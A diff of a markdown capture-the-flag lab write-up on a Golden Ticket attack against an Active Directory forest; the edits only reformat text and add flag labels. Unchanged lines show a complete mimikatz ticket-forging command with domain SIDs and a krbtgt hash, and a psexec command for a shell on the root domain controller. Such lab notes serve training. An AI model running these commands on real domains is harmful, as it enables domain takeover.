@@ -45,7 +45,7 @@ PS C:\Users\Administrator> `Get-ADGroup -Identity "Enterprise Admins" -Server ro
 
 ## Create the Golden ticket
 And now, with all the required information, we can create our own Golden Ticket, which will be injected in the current session.
-In mimikatz run:
+In **mimikatz** run:
 
  `kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt`
 
@@ -102,7 +102,10 @@ PS C:\Users\Administrator> `.\psexec.exe \\rootdc.thereserve.loc cmd.exe`
 ![[Golden Ticket Attack with mimikatz-20240609134803204.webp]]
 ![[Golden Ticket Attack with mimikatz-20240609134915452.webp]]
 
-## Authenticate the flag on e-citizen
+## Authenticate the flagS on e-citizen
+
+> Flag 15, Foothold on Parent Domain
+> Flag 16, Administrative access to Parent Domain
 
 [[Flag Submission Process]]
 
